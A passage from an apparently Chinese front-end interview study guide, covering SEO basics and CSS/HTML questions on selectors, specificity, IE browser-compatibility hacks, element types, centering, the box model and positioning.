Directory自身不是搜索引擎，而是一个大型的网站目录，<br>他和搜索引擎的主要区别是网站内容的收集方式不同。目录是人工编辑的，主要收录网站主页；<br>搜索引擎是自动收集的，除了主页外还抓取大量的内容页面。</p><blockquote><p>按点击付费的搜索引擎</p></blockquote><p>搜索引擎也需要生存，随着互联网商务的越来越成熟，收费的搜索引擎也开始大行其道。<br>最典型的有 Overture 和百度，当然也包括 Google 的广告项目 Google Adwords。<br>越来越多的人通过搜索引擎的点击广告来定位商业网站，这里面也大有优化和排名的学问，用最少的广告投入获得最多的点击。</p><blockquote><p>搜索引擎登录</p></blockquote><p>网站做完了以后，要让别人找到你，最简单的办法就是将网站提交（submit）到搜索引擎。<br>如果是商业网站，主要的搜索引擎和目录都会要求你付费来获得收录（比如 Yahoo 要299美元）<br>但是好消息是（至少到目前为止）最大的搜索引擎 Google 目前还是免费，<br>而且它主宰着 60％ 以上的搜索市场。</p><blockquote><p>链接交换和链接广泛度（Link Popularity）</p></blockquote><p>网页内容都是以超文本（Hypertext）的方式来互相链接的，网站之间也是如此<br>除了搜索引擎以外，人们也每天通过不同网站之间的链接来Surfing（“冲浪”）<br>其它网站到你的网站的链接越多，你也就会获得更多的访问量<br>更重要的是，你的网站的外部链接数越多，会被搜索引擎认为它的重要性越大，从而给你更高的排名</p><blockquote><p>合理的标签使用</p></blockquote><h2 id="18、有哪些方式可以对一个-DOM-设置它的-CSS-样式？"><a href="#18、有哪些方式可以对一个-DOM-设置它的-CSS-样式？" class="headerlink" title="18、有哪些方式可以对一个 DOM 设置它的 CSS 样式？　"></a>18、有哪些方式可以对一个 DOM 设置它的 CSS 样式？　</h2><blockquote><p>外部样式表，引入一个外部css文件<br>内部样式表，将css代码放在 标签内部<br>内联样式，将css样式直接定义在 HTML 元素内部</p></blockquote><h2 id="19、CSS-选择器"><a href="#19、CSS-选择器" class="headerlink" title="19、CSS 选择器"></a>19、CSS 选择器</h2><blockquote><p>派生选择器/标签选择器（用 HTML 标签申明, div, h1, p）<br>id选择器（用 DOM 的 ID 申明, #myid）<br>类选择器（用一个样式类名申明, .myclassname）<br>属性选择器（用DOM的属性申明，属于CSS2，IE6不支持，不常用，不知道就算了）<br>除了前3种基本选择器，还有一些扩展选择器，包括<br>后代选择器（利用空格间隔，比如div .a{}）<br>群组选择器（利用逗号间隔，比如p,div,#a{}）<br>相邻选择器（h1 + p）<br>子选择器（ul &gt; li）<br>通配符选择器（ * ）<br>属性选择器（a[rel = “external”]）<br>伪类选择器（a: hover, li: nth - child）</p></blockquote><p>CSS3 新增伪类举例：</p><blockquote><p>p:first-of-type 选择属于其父元素的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:last-of-type 选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-of-type 选择属于其父元素唯一的 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-child 选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:nth-child(2) 选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。<br>:enabled、:disabled 控制表单控件的禁用状态。<br>:checked 单选框或复选框被选中。</p></blockquote><p>可继承： font-size font-family color, UL LI DL DD DT;<br>不可继承 ：border padding margin width height ;<br>优先级就近原则，样式定义最近者为准; 载入样式以最后载入的定位为准;</p><p>CSS选择器的优先级是怎么样定义的? <code>!important &gt; id &gt; class &gt; tag</code></p><p>important 比 内联优先级高。</p><p>基本原则：一般而言，选择器越特殊，它的优先级越高。也就是选择器指向的越准确，它的优先级就越高。</p><p>复杂的计算方法：</p><blockquote><p>用1表示派生选择器的优先级<br>用10表示类选择器的优先级<br>用100标示ID选择器的优先级<br>div.test1 .span var 优先级 1+10 +10 +1<br>span#xxx .songs li 优先级1+100 + 10 + 1</p></blockquote><p><code>#xxx li 优先级 100 +1</code></p><p>那么问题来了，看下列代码，</p><p>标签内的文字是什么颜色的？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.classA&#123; <span class="attr">color</span>:blue;&#125;</span><br><span class="line">.classB&#123; <span class="attr">color</span>:red;&#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;p class='classB classA'&gt; 123 &lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br></pre></td></tr></table></figure><p>red。与样式定义在文件中的先后顺序有关，即是后面的覆盖前面的，与在<code>&lt;p class=&#39;classB classA&#39;&gt;</code>中的先后关系无关。</p><h2 id="20、CSS-中可以通过哪些属性定义，使得一个-DOM-元素不显示在浏览器可视范围内？"><a href="#20、CSS-中可以通过哪些属性定义，使得一个-DOM-元素不显示在浏览器可视范围内？" class="headerlink" title="20、CSS 中可以通过哪些属性定义，使得一个 DOM 元素不显示在浏览器可视范围内？"></a>20、CSS 中可以通过哪些属性定义，使得一个 DOM 元素不显示在浏览器可视范围内？</h2><blockquote><p>最基本的：设置 display 属性为 none ，或者设置 visibility 属性为 hidden<br>技巧性：设置宽高为 0，设置透明度为 0，设置 z-index 位置在 -1000em</p></blockquote><h2 id="21、超链接访问过后-hover-就样式不出现的问题是什么？如何解决？"><a href="#21、超链接访问过后-hover-就样式不出现的问题是什么？如何解决？" class="headerlink" title="21、超链接访问过后 hover 就样式不出现的问题是什么？如何解决？"></a>21、超链接访问过后 hover 就样式不出现的问题是什么？如何解决？</h2><p>被点击访问过的超链接样式不在具有 hover 和 active 了；</p><p>解决方法是改变CSS属性的排列顺序:<code>L-V-H-A（link, visited, hover, active）</code></p><h2 id="22-什么是-Css-Hack？ie6-7-8-的-hack-分别是什么？"><a href="#22-什么是-Css-Hack？ie6-7-8-的-hack-分别是什么？" class="headerlink" title="22. 什么是 Css Hack？ie6,7,8 的 hack 分别是什么？"></a>22. 什么是 Css Hack？ie6,7,8 的 hack 分别是什么？</h2><p>针对不同的浏览器写不同的CSS code的过程，就是CSS hack。</p><p>示例如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="selector-id">#test</span>&#123;   </span><br><span class="line">      <span class="attribute">width</span>:<span class="number">300px</span>;   </span><br><span class="line">      <span class="attribute">height</span>:<span class="number">300px</span>;   </span><br><span class="line">      <span class="attribute">background-color</span>:blue;      <span class="comment">/*firefox*/</span></span><br><span class="line">      <span class="attribute">background-color</span>:red\<span class="number">9</span>;      <span class="comment">/*all ie*/</span></span><br><span class="line">      <span class="attribute">background-color</span>:yellow;    <span class="comment">/*ie8*/</span></span><br><span class="line">      +background-color:pink;        /*ie7*/</span><br><span class="line">      _<span class="selector-tag">background-color</span><span class="selector-pseudo">:orange</span>;       <span class="comment">/*ie6*/</span>    &#125;  </span><br><span class="line">      <span class="selector-pseudo">:root</span> <span class="selector-id">#test</span> &#123; <span class="attribute">background-color</span>:purple\<span class="number">9</span>; &#125;  <span class="comment">/*ie9*/</span></span><br><span class="line">@<span class="keyword">media</span> all and (min-width:<span class="number">0px</span>)</span><br><span class="line">     &#123; <span class="selector-id">#test</span> &#123;<span class="attribute">background-color</span>:black;&#125; &#125;  <span class="comment">/*opera*/</span></span><br><span class="line">@<span class="keyword">media</span> screen and (-webkit-min-device-pixel-ratio:<span class="number">0</span>)</span><br><span class="line">&#123; <span class="selector-id">#test</span> &#123;<span class="attribute">background-color</span>:gray;&#125; &#125;       <span class="comment">/*chrome and safari*/</span></span><br></pre></td></tr></table></figure><h2 id="23、行内元素和块级元素区别，行内元素的-padding-和-margin-可设置吗？"><a href="#23、行内元素和块级元素区别，行内元素的-padding-和-margin-可设置吗？" class="headerlink" title="23、行内元素和块级元素区别，行内元素的 padding 和 margin 可设置吗？"></a>23、行内元素和块级元素区别，行内元素的 padding 和 margin 可设置吗？</h2><blockquote><p>块级元素：div p h1 h2 h3 h4 form ul ol li dl dt dd<br>行内元素: a b br i span input select<br>知名的空元素：br img input link meta<br>鲜为人知的是：area base col command embed keygen param source track wbr</p></blockquote><p>块级元素(block)特性：</p><p>总是独占一行，表现为另起一行开始，而且其后的元素也必须另起一行显示;<br>宽度(width)、高度(height)、内边距(padding)和外边距(margin)都可控制;</p><p>内联元素(inline)特性：</p><p>和相邻的内联元素在同一行;<br>宽度(width)、高度(height)、内边距的 top/bottom(padding-top/padding-bottom) 和外边距的 top/bottom(margin-top/margin-bottom) 都不可改变（也就是 padding 和 margin 的 left 和 right 是可以设置的），就是里面文字或图片的大小。</p><p>那么问题来了，浏览器还有默认的天生 inline-block 元素（拥有内在尺寸，可设置高宽，但不会自动换行），有哪些？</p><p><code>&lt;input&gt; 、&lt;img&gt; 、&lt;button&gt; 、&lt;texterea&gt; 、&lt;label&gt;</code></p><p>内联元素(inline element)</p><ul><li>a – 锚点</li><li>abbr – 缩写</li><li>acronym – 首字</li><li>b – 粗体(不推荐)</li><li>big – 大字体</li><li>br – 换行</li><li>em – 强调</li><li>font – 字体设定(不推荐)</li><li>i – 斜体</li><li>img – 图片</li><li>input – 输入框</li><li>label – 表格标签</li><li>s – 中划线(不推荐)</li><li>select – 项目选择</li><li>small – 小字体文本</li><li>span – 常用内联容器，定义文本内区块</li><li>strike – 中划线</li><li>strong – 粗体强调</li><li>sub – 下标</li><li>sup – 上标</li><li>textarea – 多行文本输入框</li><li>tt – 电传文本</li><li>u – 下划线</li><li>var – 定义变量</li></ul><p>块级元素</p><ul><li>address – 地址</li><li>blockquote – 块引用</li><li>center – 举中对齐块</li><li>dir – 目录列表</li><li>div – 常用块级容易，也是css layout的主要标签</li><li>dl – 定义列表</li><li>fieldset – form控制组</li><li>form – 交互表单</li><li>h1 – 大标题</li><li>h2 – 副标题</li><li>h3 – 3级标题</li><li>h4 – 4级标题</li><li>h5 – 5级标题</li><li>h6 – 6级标题</li><li>hr – 水平分隔线</li><li>isindex – input prompt</li><li>menu – 菜单列表</li><li>noframes – frames可选内容，（对于不支持frame的浏览器显示此区块内容）</li><li>noscript – ）可选脚本内容（对于不支持script的浏览器显示此内容）</li><li>ol – 排序表单</li><li>p – 段落</li><li>pre – 格式化文本</li><li>table – 表格</li><li>ul – 非排序列表</li></ul><h2 id="24、外边距重叠、重叠的结果"><a href="#24、外边距重叠、重叠的结果" class="headerlink" title="24、外边距重叠、重叠的结果"></a>24、外边距重叠、重叠的结果</h2><p>外边距重叠就是 margin-collapse。在CSS当中，相邻的两个盒子（可能是兄弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距。这种合并外边距的方式被称为折叠，并且因而所结合成的外边距称为折叠外边距。</p><p>折叠结果遵循下列计算规则：</p><blockquote><p>两个相邻的外边距都是正数时，折叠结果是它们两者之间较大的值。<br>两个相邻的外边距都是负数时，折叠结果是两者绝对值的较大值。<br>两个外边距一正一负时，折叠结果是两者的相加的和。</p></blockquote><h2 id="25、rgba-和-opacity-的透明效果的不同"><a href="#25、rgba-和-opacity-的透明效果的不同" class="headerlink" title="25、rgba() 和 opacity 的透明效果的不同"></a>25、rgba() 和 opacity 的透明效果的不同</h2><blockquote><p>rgba() 和 opacity 都能实现透明效果<br>最大的不同是 opacity 作用于元素，以及元素内的所有内容的透明度；<br>rgba() 只作用于元素的颜色或其背景色。<br>设置 rgba 透明的元素的子元素不会继承透明效果。</p></blockquote><h2 id="26、css中可以让文字在垂直和水平方向上重叠的两个属性是什么？"><a href="#26、css中可以让文字在垂直和水平方向上重叠的两个属性是什么？" class="headerlink" title="26、css中可以让文字在垂直和水平方向上重叠的两个属性是什么？"></a>26、css中可以让文字在垂直和水平方向上重叠的两个属性是什么？</h2><blockquote><p>垂直方向：line-height<br>水平方向：letter-spacing</p></blockquote><p><strong>关于 letter-spacing 的巧妙使用：</strong></p><blockquote><p>可以用于消除inline-block元素间的换行符空格间隙问题。</p></blockquote><p><strong>如何垂直居中一个浮动元素</strong></p><p>方法一：已知元素的高宽</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#div1</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#6699FF</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute; <span class="comment">/* 父元素需要相对定位 */</span></span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">100px</span> ; <span class="comment">/* 二分之一的height，width */</span></span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>//方法二:未知元素的高宽</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#div1</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#6699FF</span>;</span><br><span class="line">  <span class="attribute">margin</span>:auto;</span><br><span class="line">  <span class="attribute">position</span>: absolute; <span class="comment">/* 父元素需要相对定位 */</span></span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如何垂直居中一个<code>&lt;img&gt;</code>用更简便的方法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#container</span> <span class="comment">/* &lt;img&gt;的容器设置如下 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">display</span>:table-cell;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">    <span class="attribute">vertical-align</span>:middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="27、px-和-em-的区别"><a href="#27、px-和-em-的区别" class="headerlink" title="27、px 和 em 的区别"></a>27、px 和 em 的区别</h2><p>px 和 em 都是长度单位。</p><p>区别是：</p><blockquote><p>px 的值是固定的，指定是多少就是多少，计算比较容易。<br>em 得值不是固定的，并且 em 会继承父级元素的字体大小。<br>浏览器的默认字体高都是 16px 。<br>所以未经调整的浏览器都符合: 1em = 16px。那么 12px = 0.75em, 10px = 0.625em。</p></blockquote><h2 id="28、一个-reset-的-CSS-文件如何使用。normalize-css-是什么，有什么不同"><a href="#28、一个-reset-的-CSS-文件如何使用。normalize-css-是什么，有什么不同" class="headerlink" title="28、一个 reset 的 CSS 文件如何使用。normalize.css 是什么，有什么不同"></a>28、一个 <code>reset</code> 的 CSS 文件如何使用。normalize.css 是什么，有什么不同</h2><blockquote><p>重置样式非常多，凡是一个前端开发人员肯定有一个常用的重置 CSS 文件并知道如何使用它们。<br>原因是不同的浏览器对一些元素有不同的默认样式，如果不处理，在不同的浏览器下会存在必要的风险，或者更有戏剧性的性发生。<br>可能会用 Normalize 来代替你的重置样式文件。它没有重置所有的样式风格，但仅提供了一套合理的默认样式值。<br>既能让众多浏览器达到一致和合理，但又不扰乱其他的东西（如粗体的标题）。<br>在这一方面，无法做每一个复位重置。它也确实有些超过一个重置，它处理了怪癖，像 HTML 的 audio 元素不一致或 line-height 不一致。</p></blockquote><h2 id="29、Sass、LESS"><a href="#29、Sass、LESS" class="headerlink" title="29、Sass、LESS"></a>29、Sass、LESS</h2><p>是 CSS 预处理器，是 CSS 上的一种抽象层，是一种特殊的语法/语言编译成 CSS。<br>例如 Less 是一种动态样式语言. 将 CSS 赋予了动态语言的特性：<br>如变量，继承，运算，函数. LESS 既可以在客户端上运行 (支持IE 6+, Webkit, Firefox)，也可一在服务端运行 (借助 Node.js)。</p><p>为什么要使用它们？</p><blockquote><p>结构清晰，便于扩展。<br>可以方便地屏蔽浏览器私有语法差异。这个不用多说，封装对浏览器语法差异的重复处理，减少无意义的机械劳动。<br>可以轻松实现多重继承。<br>完全兼容 CSS 代码，可以方便地应用到老项目中。<br>LESS 只是在 CSS 语法上做了扩展，所以老的 CSS 代码也可以与 LESS 代码一同编译。</p></blockquote><h2 id="30、display-none-与visibility-hidden-的区别"><a href="#30、display-none-与visibility-hidden-的区别" class="headerlink" title="30、display:none 与visibility:hidden 的区别"></a>30、display:none 与visibility:hidden 的区别</h2><blockquote><p>display : 隐藏对应的元素但不挤占该元素原来的空间。<br>visibility: 隐藏对应的元素并且挤占该元素原来的空间。</p></blockquote><p>使用 display:none 属性后，HTML 元素（对象）的宽度、高度等各种属性值都将”丢失”;<br>使用 visibility: hidden 属性后，HTML 元素（对象）仅仅是在视觉上看不见（完全透明），它所占据的空间位置仍然存在。</p><h2 id="31、CSS-中-link-和-import-的区别"><a href="#31、CSS-中-link-和-import-的区别" class="headerlink" title="31、CSS 中 link 和 @import 的区别"></a>31、CSS 中 link 和 @import 的区别</h2><blockquote><p>Link 属于 html 标签，而 @import 是 CSS 中提供的<br>在页面加载的时候，link 会同时被加载，而 @import 引用的 CSS 会在页面加载完成后才会加载引用的 CSS<br>@import 只有在 ie5 以上才可以被识别，而 link 是 html 标签，不存在浏览器兼容性问题<br>Link 引入样式的权重大于 @import 的引用（ @import 是将引用的样式导入到当前的页面中）<br>@import 导入的样式不能使用 js 修改</p></blockquote><h2 id="32、盒模型"><a href="#32、盒模型" class="headerlink" title="32、盒模型"></a>32、盒模型</h2><p>CSS盒模型有两种：IE盒模型、标准的 W3C 盒模型模型</p><blockquote><p>盒模型：内容、内边距、外边距（一般不计入盒子实际宽度）、边框</p></blockquote><h2 id="33、初始化样式的原因"><a href="#33、初始化样式的原因" class="headerlink" title="33、初始化样式的原因"></a>33、初始化样式的原因</h2><blockquote><p>由于浏览器兼容的问题，不同的浏览器对标签的默认样式值不同，若不初始化会造成不同浏览器之间的显示差异但是初始化 CSS 会对搜索引擎优化造成小影响。</p></blockquote><h2 id="34、BFC-块级格式化上下文"><a href="#34、BFC-块级格式化上下文" class="headerlink" title="34、BFC 块级格式化上下文"></a>34、BFC 块级格式化上下文</h2><p>BFC 是指浏览器中创建了一个独立的渲染区域，该区域内所有元素的布局不会影响到区域外元素的布局，这个渲染区域只对块级元素起作用</p><blockquote><p>一个创建了新的 BFC 的盒子是独立布局的，盒子内元素的布局不会影响盒子外面的元素。<br>在同一个BFC中的两个相邻的盒子在垂直方向发生margin重叠的问题；</p></blockquote><h2 id="35、html语义化"><a href="#35、html语义化" class="headerlink" title="35、html语义化"></a>35、html语义化</h2><blockquote><p>当页面样式加载失败的时候能够让页面呈现出清晰的结构<br>有利于 seo 优化，利于被搜索引擎收录（更便于搜索引擎的爬虫程序来识别）<br>便于项目的开发及维护，使 html 代码更具有可读性，便于其他设备解析。</p></blockquote><h2 id="36、严格模式与混杂模式的区别？"><a href="#36、严格模式与混杂模式的区别？" class="headerlink" title="36、严格模式与混杂模式的区别？"></a>36、严格模式与混杂模式的区别？</h2><ul><li>严格模式下：<ul><li>页面排版及 JS 解析是以该浏览器支持的最高标准来执行</li></ul></li><li>混杂模式：<ul><li>不严格按照标准执行，主要用来兼容旧的浏览器，向后兼容</li><li>页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。</li></ul></li></ul><h2 id="37、IE-的双边距-BUG"><a href="#37、IE-的双边距-BUG" class="headerlink" title="37、IE 的双边距 BUG"></a>37、IE 的双边距 BUG</h2><p>出现条件：IE6、块级元素、float、横向margin，<br>出现问题：e6 显示的 横向的 margin 放大两倍。<br>解决办法：加入_display：inline</p><h2 id="38-HTML-与-XHTML-区别"><a href="#38-HTML-与-XHTML-区别" class="headerlink" title="38. HTML 与 XHTML 区别"></a>38. HTML 与 XHTML 区别</h2><ul><li>所有的标记都必须要有一个相应的结束标记</li><li>所有标签的元素和属性的名字都必须使用小写</li><li>所有的 XML 标记都必须合理嵌套</li><li>所有的属性必须用引号 “” 括起来</li><li>把所有 &lt; 和 &amp; 特殊符号用编码表示</li><li>给所有属性赋一个值</li><li>不要在注释内容中使用 “–”</li><li>图片必须有说明文字</li></ul><h2 id="39、html常见兼容性问题"><a href="#39、html常见兼容性问题" class="headerlink" title="39、html常见兼容性问题"></a>39、html常见兼容性问题</h2><blockquote><p>IE6.7 下的双边距 BUG 块级元素浮动有 margin 值引起的。使用 display: inline 解决<br>标准浏览器下，子元素不会撑开父级元素设置好的宽度，在 IE6 下会撑开。解决办法：计算精准<br>IE6.7 下元素浮动如果宽度需要内容撑开，就给里面块的元素都加浮动<br>IE6.7 下元素通过浮动并在一行，就给两个元素都加浮动，不要给第二个元素加 margin-left<br>最小高度问题，小于 19px 当做 19px 处理。解决方法：overflow: hidden<br>IE6 下 1px 的点线不支持。解决方法：切背景图平铺<br>IE6.7 下，li 本身没有浮动，但内容有浮动，li 下面就会产生间隙。解决办法：给父级元素加宽度并清浮动，li 加 vertical: top;<br>IE6.7 下最小高度问题和 li 下间隙问题并存时给 li 加浮动，加宽度，加 overflow: hidden;<br>IE6.7 下的文字溢出 bug，子元素宽度和父级元素宽度相差小于3像素，在两个浮动元素之间有注释或者内嵌元素时。解决：用<code>&lt;div&gt;&lt;/div&gt;</code> 包起来<br>IE6.7 下当浮动元素和绝对定位元素是并列关系，绝对定位元素会消失。解决：在定位元素外套 <code>&lt;div&gt;&lt;/div&gt;</code><br>3像素问题 使用float引起的 使用dislpay:inline -3px<br>超链接 hover 点击后失效 使用正确的书写顺序 link visited hover active<br>Ie z-index问题 给父级添加 position:relative<br>Png 透明 使用js代码 改<br>Min-height 最小高度 ！Important 解决<br>select 在ie6下遮盖 使用 iframe 嵌套<br>为什么没有办法定义 1px 左右的宽度容器（IE6默认的行高造成的，使用 over:hidden, zoom:0.08 line-height:1px）<br>IE5-8不支持 opacity，解决办法：</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.opacity</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.4</span></span><br><span class="line">    filter: <span class="built_in">alpha</span>(opacity=60); <span class="comment">/* for IE5-7 */</span></span><br><span class="line">    <span class="attribute">-ms-filter</span>: <span class="string">"progid:DXImageTransform.Microsoft.Alpha(Opacity=60)"</span>; <span class="comment">/* for IE 8*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>png24为的图片在iE6浏览器上出现背景，解决方案是做成 PNG8.</p></blockquote><p>浏览器默认的 margin 和 padding 不同。解决方案是加一个全局的 *{margin:0;padding:0;} 来统一。<code>_display:inline;</code>将其转化为行内属性。(<code>_</code>这个符号只有ie6会识别)</p><p>渐进识别的方式，从总体中逐渐排除局部。</p><ul><li>首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。</li><li>接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bb</span>&#123;</span><br><span class="line">   <span class="attribute">background-color</span>:<span class="number">#f1ee18</span>;<span class="comment">/*所有识别*/</span></span><br><span class="line">  <span class="attribute">.background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>; <span class="comment">/*IE6、7、8识别*/</span></span><br><span class="line">  +background-color:#a200ff;/*IE6、7识别*/</span><br><span class="line">  _<span class="selector-tag">background-color</span>:<span class="selector-id">#1e0bd1</span>;<span class="comment">/*IE6识别*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>IE下,可以使用获取常规属性的方法来获取自定义属性, 也可以使用 getAttribute() 获取自定义属性;<br>Firefox下,只能使用 getAttribute() 获取自定义属性. 解决方法: 统一通过 etAttribute() 获取自定义属性.<br>IE下,even 对象有 x, y 属性,但是没有 pageX, pageY 属性;<br>Firefox下, event 对象有 pageX, pageY 属性,但是没有 x, y 属性.<br>（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。<br>Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示, 可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决.<br>IE6不支持PNG透明背景，解决办法: IE6下使用gif图片</p></blockquote><h2 id="40、对-WEB-标准以及-W3C-的理解与认识"><a href="#40、对-WEB-标准以及-W3C-的理解与认识" class="headerlink" title="40、对 WEB 标准以及 W3C 的理解与认识"></a>40、对 WEB 标准以及 W3C 的理解与认识</h2><blockquote><p>标签闭合<br>标签小写<br>不乱嵌套<br>提高搜索机器人搜索几率<br>使用外链css和js脚本<br>结构行为表现的分离<br>文件下载与页面速度更快<br>内容能被更多的用户所访问<br>内容能被更广泛的设备所访问<br>更少的代码和组件<br>容易维护<br>改版方便<br>不需要变动页面内容<br>提供打印版本而不需要复制内容<br>提高网站易用性</p></blockquote><h2 id="41、前端页面由什么构成"><a href="#41、前端页面由什么构成" class="headerlink" title="41、前端页面由什么构成"></a>41、前端页面由什么构成</h2><ul><li>结构层<ul><li>Html</li></ul></li><li>表示层<ul><li>CSS</li></ul></li><li>行为层<ul><li>js</li></ul></li></ul><h2 id="42、如何居中-div-如何居中一个浮动元素"><a href="#42、如何居中-div-如何居中一个浮动元素" class="headerlink" title="42、如何居中 div, 如何居中一个浮动元素"></a>42、如何居中 div, 如何居中一个浮动元素</h2><p>给 div 设置一个宽度，然后添加 margin:0 auto 属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>居中一个浮动元素<br>确定容器的宽高 宽 500 高 300 的层, 设置层的外边距</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div</span> &#123; </span><br><span class="line">   <span class="attribute">width</span>:<span class="number">500px</span> ; <span class="attribute">height</span>:<span class="number">300px</span>; <span class="comment">/* 高度可以不设 */</span></span><br><span class="line">   <span class="attribute">margin</span>: -<span class="number">150px</span> <span class="number">0</span> <span class="number">0</span> -<span class="number">250px</span>;</span><br><span class="line">   <span class="attribute">position</span>:relative; <span class="comment">/*相对定位*/</span></span><br><span class="line">   <span class="attribute">background-color</span>:pink; <span class="comment">/*方便看效果*/</span></span><br><span class="line">   <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">   <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="43、display的值和作用、position的值"><a href="#43、display的值和作用、position的值" class="headerlink" title="43、display的值和作用、position的值"></a>43、display的值和作用、position的值</h2><p>block 像块级元素一样显示</p><ul><li>none 缺省值</li><li>inline-block<ul><li>像行内元素一样显示，但其内容像块类型元素一样显示</li></ul></li><li>list-item<ul><li>像块类型元素一样显示，并添加样式列表标记。</li></ul></li></ul><p>position的值</p><ul><li>absolute<ul><li>生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。</li></ul></li><li>fixed （老IE不支持）<ul><li>生成绝对定位的元素，相对于浏览器窗口进行定位。</li></ul></li><li>relative<ul><li>生成相对定位的元素，相对于其正常位置进行定位。</li></ul></li><li>static<ul><li>默认值。没有定位，元素出现在正常的流中</li><li>忽略 top, bottom, left, right z-index 声明</li></ul></li><li>inherit<ul><li>规定从父元素继承 position 属性的值。</li></ul></li></ul><h2 id="44、absolute-的-containing-block-计算方式跟正常流有什么不同"><a href="#44、absolute-的-containing-block-计算方式跟正常流有什么不同" class="headerlink" title="44、absolute 的 containing block 计算方式跟正常流有什么不同"></a>44、absolute 的 containing block 计算方式跟正常流有什么不同</h2><ul><li>lock-level boxes<ul><li>一个 block-level element (‘display’ 属性值为 ‘block’, ‘list-item’ 或是 ‘table’)</li><li>会生成一个 block-level box，这样的盒子会参与到 block-formatting context (一种布局的方式) 